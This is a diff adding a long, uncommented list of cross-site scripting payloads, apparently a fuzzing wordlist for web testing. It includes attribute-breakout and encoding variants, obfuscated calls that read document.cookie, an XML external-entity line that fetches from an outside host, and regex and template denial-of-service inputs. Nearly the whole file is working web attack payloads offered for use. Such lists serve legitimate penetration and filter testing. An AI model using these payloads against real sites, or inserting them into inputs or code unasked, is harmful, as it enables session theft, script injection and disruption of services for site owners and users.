@@ -1,0 +1,400 @@
+'onmouseover='alert(1)'a='
+'%20onmouseover=alert(1)'
+%22%20onmouseover=javascript:alert(1)%20%22
+\');alert(1);//
+);alert(1)//
+');alert(1)//
+%26%2339;-alert(1)//
+%22);alert(1);//
+%E0<body onload=alert(1)>
+%00<body onload=alert(1)>
+X'%20alert(1)%2F%2F
+X%22%20alert(1)%2F%2F
+%5C%5C'%2Balert(1)%3B%2F%2F
+%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
+alert(1)%3B
+%3Cscript%3Ea%3D%2FX%2F
+alert(1)%3C%2Fscript%3E
+%22%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
+X%20-%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+X%20%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
+<SCRIPT>alert(1);</SCRIPT>
+</ScrIpt><SCRIPT>alert(1);</SCRIPT>
+"><SCRIPT>alert(1);</SCRIPT>
+</ScrIpt><SCRIPT>alert(1);</SCRIPT>
+'><SCRIPT>alert(1);</SCRIPT>
+</ScrIpt><SCRIPT>alert(1);</SCRIPT>
+<META HTTP-EQUIV="Link" Content="<javascript:alert(1)>; REL=stylesheet">
+"><META HTTP-EQUIV="Link" Content="<javascript:alert(1)>; REL=stylesheet">
+'><META HTTP-EQUIV="Link" Content="<javascript:alert(1)>; REL=stylesheet">
+<STYLE>.X{background-image:url("javascript:alert(1)");}</STYLE>
+"><STYLE>.X{background-image:url("javascript:alert(1)");}</STYLE>
+'><STYLE>.X{background-image:url("javascript:alert(1)");}</STYLE><A CLASS=X></A>
+"><STYLE>.X{background-image:url("javascript:alert(1)");}</STYLE><A CLASS=X></A>
+'><STYLE>.X{background-image:url("javascript:alert(1)");}</STYLE><A CLASS=X></A>
+"><A CLASS=X></A>
+'><A CLASS=X></A>
+<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert(1);">
+"><!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert(1);">
+'><!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert(1);">
+<img src=a onerror=alert(1)
+"><img src=a onerror=alert(1)
+'><img src=a onerror=alert(1) %0A>
+"><img src=a onerror=alert(1) %0A>
+'><img src=a onerror=alert(1) %0A>
+<img src="x" class="''onerror=alert(1)">
+"><img src="x" class="''onerror=alert(1)">
+'><img src="x" class="''onerror=alert(1)">
+0<aside xmlns="x><img src=x onerror=alert(1)">1</aside>
+0<aside xmlns="x><script>alert(1)</script>
+</ScrIpt><script>alert(1)</script>
+"><script>alert(1)</script>
+</ScrIpt><script>alert(1)</script>
+'><script>alert(1)</script>
+</ScrIpt><script>alert(1)</script>">1</aside>
+0<aside xmlns="foo:img src=x onerror=alert(1)>">123
+<p  style="font-family:'\22\3bx:expression(alert(1))/*'">
+"><p  style="font-family:'\22\3bx:expression(alert(1))/*'">
+'><p  style="font-family:'\22\3bx:expression(alert(1))/*'">
+<p style="font-family: 'foo\27\3b color\3a expression(alert(1))/*
+"><p style="font-family: 'foo\27\3b color\3a expression(alert(1))/*
+'><p style="font-family: 'foo\27\3b color\3a expression(alert(1))/*
+<p style="fon\22\3e\3cimg\20src\3dx\20onerror\3d alert\28 1\29\3et-family:'foobar'">
+"><p style="fon\22\3e\3cimg\20src\3dx\20onerror\3d alert\28 1\29\3et-family:'foobar'">
+'><p style="fon\22\3e\3cimg\20src\3dx\20onerror\3d alert\28 1\29\3et-family:'foobar'">
+<p style="filter: 'expression(alert(1))'">
+"><p style="filter: 'expression(alert(1))'">
+'><p style="filter: 'expression(alert(1))'">
+<svg><style>&ltimg src=x onerror=alert(1)&gt</svg>
+"><svg><style>&ltimg src=x onerror=alert(1)&gt</svg>
+'><svg><style>&ltimg src=x onerror=alert(1)&gt</svg>
+<p style="font-family: 'foo&amp;x5c;27&amp;#x5c;3bx:expr&amp;#x65;ession(alert(1))'">
+"><p style="font-family: 'foo&amp;x5c;27&amp;#x5c;3bx:expr&amp;#x65;ession(alert(1))'">
+'><p style="font-family: 'foo&amp;x5c;27&amp;#x5c;3bx:expr&amp;#x65;ession(alert(1))'">
+<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+"><iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+'><iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+<svg><script xlink:href=data&colon;,window.open('http://www.opensecurity.in')></script
+"><svg><script xlink:href=data&colon;,window.open('http://www.opensecurity.in')></script
+'><svg><script xlink:href=data&colon;,window.open('http://www.opensecurity.in')></script
+http://www.opensecurity<script .in>alert(document.location)</script
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver
+<div/style="width:expression(confirm(1))">X</div>
+"><div/style="width:expression(confirm(1))">X</div>
+'><div/style="width:expression(confirm(1))">X</div>
+perl -e 'print "&lt;IMG SRC=java\0script:alert(\"X\")&gt;";' &gt; out
+perl -e 'print "&lt;SCR\0IPT&gt;alert(\"X\")&lt;/SCR\0IPT&gt;";' &gt; out
+perl -e 'print "<IMG SRC=java\0script:alert(1)>";'> out
+window["ale"+(!![]+[])[-~[]]+(!![]+[])[+[]]]()
+window["ale"+"\x72\x74"]()
+window["\x61\x6c\x65\x72\x74"]()
+window['ale'+(!![]+[])[-~[]]+(!![]+[])[+[]]]()
+window['ale'+'\x72\x74']()
+window['\x61\x6c\x65\x72\x74']()
+window[(+{}+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]]]((-~[]+[]))
+window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]
+this["ale"+(!![]+[])[-~[]]+(!![]+[])[+[]]]()
+this["ale"+"\x72\x74"]()
+this["\x61\x6c\x65\x72\x74"]()
+this['ale'+'\x72\x74']()
+this['\x61\x6c\x65\x72\x74']()
+this[(+{}+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]]]((-~[]+[]))
+this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]
+this["document"]["cookie"]
+this["document"]["\x63\x6f\x6f\x6b\x69\x65"]
+this["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["cookie"]
+this["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x63\x6f\x6f\x6b\x69\x65"]
+this["document"][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+"kie"]
+this["document"][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+"\x6b\x69\x65"]
+this["docum"+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+"\x6b\x69\x65"]
+this["docum"+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+"kie"]
+this["docum"+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]]["\x63\x6f\x6f\x6b\x69\x65"]
+this["docum"+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]]["cookie"]
+this["\x64\x6f\x63\x75\x6d"+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+"\x6b\x69\x65"]
+this["\x64\x6f\x63\x75\x6d"+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+"kie"]
+this["\x64\x6f\x63\x75\x6d"+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]]["\x63\x6f\x6f\x6b\x69\x65"]
+this["\x64\x6f\x63\x75\x6d"+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]]["cookie"]
+this['document']['cookie']
+this['document']['\x63\x6f\x6f\x6b\x69\x65']
+this['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['cookie']
+this['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x63\x6f\x6f\x6b\x69\x65']
+this['document'][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+'kie']
+this['document'][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+'\x6b\x69\x65']
+this['docum'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+'\x6b\x69\x65']
+this['docum'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+'kie']
+this['docum'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]]['\x63\x6f\x6f\x6b\x69\x65']
+this['docum'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]]['cookie']
+this['\x64\x6f\x63\x75\x6d'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+'\x6b\x69\x65']
+this['\x64\x6f\x63\x75\x6d'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+'kie']
+this['\x64\x6f\x63\x75\x6d'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]]['\x63\x6f\x6f\x6b\x69\x65']
+this['\x64\x6f\x63\x75\x6d'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]]['cookie']
+document["cookie"]
+document["\x63\x6f\x6f\x6b\x69\x65"]
+document[({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+"kie"]
+document[({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+"\x6b\x69\x65"]
+document['cookie']
+document['\x63\x6f\x6f\x6b\x69\x65']
+document[({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+'kie']
+document[({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+'\x6b\x69\x65']
+%3Cscript%3Edocument.body.innerHTML=%22%3Ca%20onmouseover%0B=location=%27\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x63\x6F\x6E\x66\x69\x72\x6D\x26\x6C\x70\x61\x72\x3B\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x63\x6F\x6F\x6B\x69\x65\x26\x72\x70\x61\x72\x3B%27%3E%3Cinput%20name=attributes%3E%22;%3C/script%3E
+<meta http-equiv="X-UA-Compatible" content="IE=5"><p style="font-family:',;a\\22\\3e\\3cimg\\20src\\3dx\\20onerror\\3d\\61lert\\28\\31\\29\\3e:1'">oh-oh</p>
+"><meta http-equiv="X-UA-Compatible" content="IE=5"><p style="font-family:',;a\\22\\3e\\3cimg\\20src\\3dx\\20onerror\\3d\\61lert\\28\\31\\29\\3e:1'">oh-oh</p>
+'><meta http-equiv="X-UA-Compatible" content="IE=5"><p style="font-family:',;a\\22\\3e\\3cimg\\20src\\3dx\\20onerror\\3d\\61lert\\28\\31\\29\\3e:1'">oh-oh</p>
+<iframe/onload=action=/confir/.source+'m';eval(action)(1)>
+"><iframe/onload=action=/confir/.source+'m';eval(action)(1)>
+'><iframe/onload=action=/confir/.source+'m';eval(action)(1)>
+<!--[if WindowsEdition]><script>confirm(1);</script><![endif]-->
+"><!--[if WindowsEdition]><script>confirm(1);</script><![endif]-->
+'><!--[if WindowsEdition]><script>confirm(1);</script><![endif]-->
+<img src=x onerror=confirm(/X/)>
+"><img src=x onerror=confirm(/X/)>
+'><img src=x onerror=confirm(/X/)>
+<form/action=ja&Tab;vascr&Tab;ipt&colon;confirm(1)> <button/type=submit>
+"><form/action=ja&Tab;vascr&Tab;ipt&colon;confirm(1)> <button/type=submit>
+'><form/action=ja&Tab;vascr&Tab;ipt&colon;confirm(1)> <button/type=submit>
+<style/onload    =    !-alert&#x28;1&#x29;>
+"><style/onload    =    !-alert&#x28;1&#x29;>
+'><style/onload    =    !-alert&#x28;1&#x29;>
+<iframe/name="if(0){\u0061lert(1)}else{\u0061lert(1)}"/onload="eval(name)";>
+"><iframe/name="if(0){\u0061lert(1)}else{\u0061lert(1)}"/onload="eval(name)";>
+'><iframe/name="if(0){\u0061lert(1)}else{\u0061lert(1)}"/onload="eval(name)";>
+<svg><?GMO=`<ftw=`skrowtillehehtwoh; onload=confirm(location);
+"><svg><?GMO=`<ftw=`skrowtillehehtwoh; onload=confirm(location);
+'><svg><?GMO=`<ftw=`skrowtillehehtwoh; onload=confirm(location);
+"><img src=x onerror=confirm(1);>
+#&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;
+<img/src=x alt=confirm(1) onerror=eval(alt)>
+"><img/src=x alt=confirm(1) onerror=eval(alt)>
+'><img/src=x alt=confirm(1) onerror=eval(alt)>
+<img src=x onerror=alert(1)//>
+"><img src=x onerror=alert(1)//>
+'><img src=x onerror=alert(1)//>
+<svg><g/onload=alert(1)//
+"><svg><g/onload=alert(1)//
+'><svg><g/onload=alert(1)//
+<iframe/\/src=jAva&Tab;script:alert(1)>
+"><iframe/\/src=jAva&Tab;script:alert(1)>
+'><iframe/\/src=jAva&Tab;script:alert(1)>
+<math><mi//xlink:href="data:x,<script>alert(1)</script>
+</ScrIpt><script>alert(1)</script>
+"><script>alert(1)</script>
+</ScrIpt><script>alert(1)</script>
+'><script>alert(1)</script>
+</ScrIpt><script>alert(1)</script>">
+onClick="alert('Hello \u0022>')"
+onload=alert(1)
+" onload=alert(1) "
+" onload=alert(1)
+onload=alert(1) "
+" onload=alert(1) id="a
+onload =alert(1) id="a
+<a href='
+"><a href='
+'><a href='
+javascript:alert(1)'>a</a>
+<listing>&lt;img onerror="alert(1);//" src=1&gt;<t t></listing>
+"><listing>&lt;img onerror="alert(1);//" src=1&gt;<t t></listing>
+'><listing>&lt;img onerror="alert(1);//" src=1&gt;<t t></listing>
+<img src=x id/=' onerror=alert(1)//'>
+"><img src=x id/=' onerror=alert(1)//'>
+'><img src=x id/=' onerror=alert(1)//'>
+<textarea>X</textarea><!--</textarea><img src=x onerror=alert(1)>-->
+"><textarea>X</textarea><!--</textarea><img src=x onerror=alert(1)>-->
+'><textarea>X</textarea><!--</textarea><img src=x onerror=alert(1)>-->
+<b><noscript><!-- </noscript><img src=xx: onerror=alert(1) --></noscript>
+"><b><noscript><!-- </noscript><img src=xx: onerror=alert(1) --></noscript>
+'><b><noscript><!-- </noscript><img src=xx: onerror=alert(1) --></noscript>
+<b><noscript><a alt="</noscript><img src=xx: onerror=alert(1)>"></noscript>
+"><b><noscript><a alt="</noscript><img src=xx: onerror=alert(1)>"></noscript>
+'><b><noscript><a alt="</noscript><img src=xx: onerror=alert(1)>"></noscript>
+<body><template><s><template><s><img src=x onerror=alert(1)>X</s></template></s></template>
+"><body><template><s><template><s><img src=x onerror=alert(1)>X</s></template></s></template>
+'><body><template><s><template><s><img src=x onerror=alert(1)>X</s></template></s></template>
+<a href="javascript:alert(1)">X<a>
+"><a href="javascript:alert(1)">X<a>
+'><a href="javascript:alert(1)">X<a>
+<option><style></option></select><b><img src=xx: onerror=alert(1)></style></option>
+<option><iframe></select><b><script>alert(1)</script>
+</ScrIpt><script>alert(1)</script>
+"><script>alert(1)</script>
+</ScrIpt><script>alert(1)</script>
+'><script>alert(1)</script>
+</ScrIpt><script>alert(1)</script></iframe></option>
+<b><style><style/><img src=xx: onerror=alert(1)>
+"><b><style><style/><img src=xx: onerror=alert(1)>
+'><b><style><style/><img src=xx: onerror=alert(1)>
+<b><style><style////><img src=xx: onerror=alert(1)></style>
+"><b><style><style////><img src=xx: onerror=alert(1)></style>
+'><b><style><style////><img src=xx: onerror=alert(1)></style>
+<image name=body><image name=adoptNode>X<image name=firstElementChild><svg onload=alert(1)>
+"><image name=body><image name=adoptNode>X<image name=firstElementChild><svg onload=alert(1)>
+'><image name=body><image name=adoptNode>X<image name=firstElementChild><svg onload=alert(1)>
+<image name=activeElement><svg onload=alert(1)>
+"><image name=activeElement><svg onload=alert(1)>
+'><image name=activeElement><svg onload=alert(1)>
+<image name=body><img src=x><svg onload=alert(1); autofocus>, <keygen onfocus=alert(1); autofocus>
+"><image name=body><img src=x><svg onload=alert(1); autofocus>, <keygen onfocus=alert(1); autofocus>
+'><image name=body><img src=x><svg onload=alert(1); autofocus>, <keygen onfocus=alert(1); autofocus>
+<div onmouseout="javascript:alert(/X/)" x=yscript: n>X
+"><div onmouseout="javascript:alert(/X/)" x=yscript: n>X
+'><div onmouseout="javascript:alert(/X/)" x=yscript: n>X
+<div wow=removeme onmouseover=alert(1)>text
+"><div wow=removeme onmouseover=alert(1)>text
+'><div wow=removeme onmouseover=alert(1)>text
+<input x=javascript: autofocus onfocus=alert(1)><svg id=1 onload=alert(1)></svg>
+"><input x=javascript: autofocus onfocus=alert(1)><svg id=1 onload=alert(1)></svg>
+'><input x=javascript: autofocus onfocus=alert(1)><svg id=1 onload=alert(1)></svg>
+<form action="javascript:alert(1)"><button>X</button></form>
+"><form action="javascript:alert(1)"><button>X</button></form>
+'><form action="javascript:alert(1)"><button>X</button></form>
+0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='))
+<input onfocus=alert(1) autofocus>
+"><input onfocus=alert(1) autofocus>
+'><input onfocus=alert(1) autofocus>
+<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg
+"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg
+'><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg>
+"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg>
+'><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg>
+<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>
+"><x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>
+'><x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>
+<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>
+"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>
+'><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>
+<script>({0:#0=alert/#0#/#0#(0)})</script>
+</ScrIpt><script>({0:#0=alert/#0#/#0#(0)})</script>
+"><script>({0:#0=alert/#0#/#0#(0)})</script>
+</ScrIpt><script>({0:#0=alert/#0#/#0#(0)})</script>
+'><script>({0:#0=alert/#0#/#0#(0)})</script>
+</ScrIpt><script>({0:#0=alert/#0#/#0#(0)})</script>
+X<x style=`behavior:url(#default#time2)` onbegin=`alert(1)` >
+<meta charset="x-mac-farsi">?script ?alert(1)//?/script ?
+"><meta charset="x-mac-farsi">?script ?alert(1)//?/script ?
+'><meta charset="x-mac-farsi">?script ?alert(1)//?/script ?
+<input onblur=focus() autofocus><input>
+"><input onblur=focus() autofocus><input>
+'><input onblur=focus() autofocus><input>
+<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(1)>X</button>
+"><form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(1)>X</button>
+'><form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(1)>X</button>
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`behAvior:url(#default#time2)` attributename=`innerhtml` to=`<img/src="x"onerror=alert(1)>`>
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=<img/src="."onerror=alert(1)>>
+<link rel=stylesheet href=data:,*%7bx:expression(alert(1))%7d
+"><link rel=stylesheet href=data:,*%7bx:expression(alert(1))%7d
+'><link rel=stylesheet href=data:,*%7bx:expression(alert(1))%7d
+<style>@import "data:,*%7bx:expression(alert(1))%7D";</style>
+"><style>@import "data:,*%7bx:expression(alert(1))%7D";</style>
+'><style>@import "data:,*%7bx:expression(alert(1))%7D";</style>
+<table background="javascript:alert(32)"></table>
+"><table background="javascript:alert(32)"></table>
+'><table background="javascript:alert(32)"></table>
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(1)">XXX</a>
+"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(1)">XXX</a>
+'><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(1)">XXX</a>
+<![><img src="]><img src=x onerror=alert(1)//">
+"><![><img src="]><img src=x onerror=alert(1)//">
+'><![><img src="]><img src=x onerror=alert(1)//">
+<svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(1)//"></svg>
+"><svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(1)//"></svg>
+'><svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(1)//"></svg>
+<<style><img src="</style><img src=x onerror=alert(1)//">
+"><<style><img src="</style><img src=x onerror=alert(1)//">
+'><<style><img src="</style><img src=x onerror=alert(1)//">
+"><style><img src="</style><img src=x onerror=alert(1)//">
+'><style><img src="</style><img src=x onerror=alert(1)//">
+<<li style=list-style:url() onerror=alert(1)></li>
+"><<li style=list-style:url() onerror=alert(1)></li>
+'><<li style=list-style:url() onerror=alert(1)></li>
+"><li style=list-style:url() onerror=alert(1)></li>
+'><li style=list-style:url() onerror=alert(1)></li>
+<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)>
+"><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)>
+'><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)>
+<video onerror="alert(1)"><source></source></video></div>
+"><video onerror="alert(1)"><source></source></video></div>
+'><video onerror="alert(1)"><source></source></video></div>
+<b <script>alert(1)//</script>0</script></b>
+"><b <script>alert(1)//</script>0</script></b>
+'><b <script>alert(1)//</script>0</script></b></div>
+"><b <script>alert(1)//</script>0</script></b></div>
+'><b <script>alert(1)//</script>0</script></b></div>
+<b><script<b></b><alert(1)</script </b></b>
+"><b><script<b></b><alert(1)</script </b></b>
+'><b><script<b></b><alert(1)</script </b></b></div>
+"><b><script<b></b><alert(1)</script </b></b></div>
+'><b><script<b></b><alert(1)</script </b></b></div>
+<div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
+"><div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
+'><div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script></div>
+"><div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script></div>
+'><div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script></div>
+<x '="foo"><x foo='><img src=x onerror=alert(1)//'>
+"><x '="foo"><x foo='><img src=x onerror=alert(1)//'>
+'><x '="foo"><x foo='><img src=x onerror=alert(1)//'>
+<! '="foo"><x foo='><img src=x onerror=alert(1)//'>
+"><! '="foo"><x foo='><img src=x onerror=alert(1)//'>
+'><! '="foo"><x foo='><img src=x onerror=alert(1)//'>
+<? '="foo"><x foo='><img src=x onerror=alert(1)//'>
+"><? '="foo"><x foo='><img src=x onerror=alert(1)//'>
+'><? '="foo"><x foo='><img src=x onerror=alert(1)//'>
+<div id="1"><embed src="javascript:alert(1)">
+"><embed src="javascript:alert(1)">
+'><embed src="javascript:alert(1)"></embed>
+<script src="javascript:alert(1)">
+"><script src="javascript:alert(1)">
+'><script src="javascript:alert(1)"></script>
+"><script src="javascript:alert(1)"></script>
+'><script src="javascript:alert(1)"></script>
+<!DOCTYPE x[<!ENTITY x SYSTEM "http://8pwn.com/xss_serve_payloads/X.xxe">]><y>&x;</y>
+"><!DOCTYPE x[<!ENTITY x SYSTEM "http://8pwn.com/xss_serve_payloads/X.xxe">]><y>&x;</y>
+'><!DOCTYPE x[<!ENTITY x SYSTEM "http://8pwn.com/xss_serve_payloads/X.xxe">]><y>&x;</y>
+<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>
+"><?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>
+'><?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>
+onerror CDATA "alert(1)"
+onload CDATA "alert(1)">
+<html:style /><x xlink:href="javascript:alert(1)" xlink:type="simple">XXX</x>
+"><html:style /><x xlink:href="javascript:alert(1)" xlink:type="simple">XXX</x>
+'><html:style /><x xlink:href="javascript:alert(1)" xlink:type="simple">XXX</x>
+<card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(1)"/></onevent><timer value="1"/></card>
+"><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(1)"/></onevent><timer value="1"/></card>
+'><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(1)"/></onevent><timer value="1"/></card>
+<div style=width:1px;filter:glow onfilterchange=alert(1)>x
+"><div style=width:1px;filter:glow onfilterchange=alert(1)>x
+'><div style=width:1px;filter:glow onfilterchange=alert(1)>x
+<// style=x:expression8alert(1)9>
+"><// style=x:expression8alert(1)9>
+'><// style=x:expression8alert(1)9>
+<event-source src="index.php" onload="alert(1)">
+"><event-source src="index.php" onload="alert(1)">
+'><event-source src="index.php" onload="alert(1)">
+<a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>
+"><a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>
+'><a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>
+<?xml-stylesheet type="text/css"?><root style="x:expression(alert(1))"/>
+"><?xml-stylesheet type="text/css"?><root style="x:expression(alert(1))"/>
+'><?xml-stylesheet type="text/css"?><root style="x:expression(alert(1))"/>
+<object allowscriptaccess="always" data="test.swf"></object>
+"><object allowscriptaccess="always" data="test.swf"></object>
+'><object allowscriptaccess="always" data="test.swf"></object>
+<style>*{x:??????????(alert(1))}</style>
+"><style>*{x:??????????(alert(1))}</style>
+'><style>*{x:??????????(alert(1))}</style>
+<x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple"/>
+"><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple"/>
+'><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple"/>
+<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(1));%7d"?>
